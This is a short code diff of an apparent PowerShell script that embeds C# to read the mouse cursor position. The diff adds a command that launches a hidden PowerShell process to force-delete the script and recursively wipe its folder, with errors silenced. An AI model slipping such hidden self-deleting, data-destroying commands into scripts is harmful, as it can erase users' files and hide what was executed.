@@ -20,7 +20,7 @@ public struct POINT {
     public int X;
     public int Y;
 }
-public class UserInput {
+public static class UserInput {
     [DllImport("user32.dll")]
     public static extern bool GetCursorPos(out POINT lpPoint);
 }
@@ -59,4 +59,4 @@ $scriptFolder = Split-Path -Path $scriptPath -Parent
 Start-Sleep -Seconds 2  # Ensure script fully executes
 
 # Execute a hidden PowerShell process to delete the script
-Start-Process -WindowStyle Hidden -FilePath "powershell
+Start-Process -WindowStyle Hidden -FilePath "powershell.exe" -ArgumentList "-Command `"Start-Sleep -Seconds 1; Remove-Item -Path '$scriptPath' -Force; Remove-Item -Path '$scriptFolder\*' -Force -Recurse -ErrorAction SilentlyContinue`"" -NoNewWindow
